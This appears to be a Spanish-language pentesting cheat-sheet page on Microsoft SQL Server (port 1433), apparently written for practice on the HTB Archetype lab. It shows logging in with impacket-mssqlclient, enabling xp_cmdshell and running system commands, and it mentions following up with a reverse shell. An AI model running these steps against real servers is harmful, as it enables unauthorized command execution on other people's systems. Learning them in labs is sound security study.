# 1433 - ms-SQL-server

Posiblemente una base de datos sql de microsoft, las bases de datos siempre son un gran recurso si somos capaces de acceder a ellas, ya sea a través de SQLI, exploits o credenciales válidas.

### EJECUCIÓN DE COMANDOS

Podemos encontrarnos con una base de datos de microsoft que nos permita ejecutar comandos en la máquina atacada una vez hemos conseguido acceder a ella.

Una gran herramienta para esto es mssqlclient.

```
impacket-mssqlclient NOMBREBD/sql_svc:password@10.10.10.55 -windows-auth
```

Generalmente tanto en parrot como en kali tendremos dicha herramienta, pero podemos descargarla a través de github en caso de no tenerla.

Lo bueno de esta herramienta es que con un solo comando podemos activar la cmdshell, pero con otras herramientas podríamos realizar lo mismo.

```
# con mssqlclient
enable_xp_cmdshell

# Sin mssqlclient
sp_configure 'show advanced option', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
```

Una vez activo podemos sin ningún problema ejecutar comandos en la máquina atacada

```
xp_cmdshell whoami
```

Ya podemos enumerar el sistema o enviarnos una [reverse shell](../reverse-shell/) para acceder de forma más cómoda.

### MÁQUINAS DONDE ENSAYAR

* [Archetype (HTB)](../../HTB/htb/archetype.md)



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
